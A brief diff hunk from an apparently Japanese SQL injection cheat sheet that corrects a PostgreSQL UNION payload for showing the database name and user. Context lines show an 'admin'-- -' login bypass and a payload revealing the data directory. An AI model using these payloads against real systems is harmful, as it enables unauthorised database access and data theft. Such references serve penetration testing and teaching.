@@ -55,7 +55,7 @@ admin'-- -
 ## PostgreSQLで使用できるクエリ
 ```bash
 # データベース名とユーザー名表示
-' UNION SELECT null,current_database(),current_user(),null-- -
+' UNION SELECT null,current_database(),current_user,null-- -
 # データ設定ディレクトリ表示
 ' UNION SELECT null,current_setting('data_directory'),null,null-- -
 # ファイル読み込み
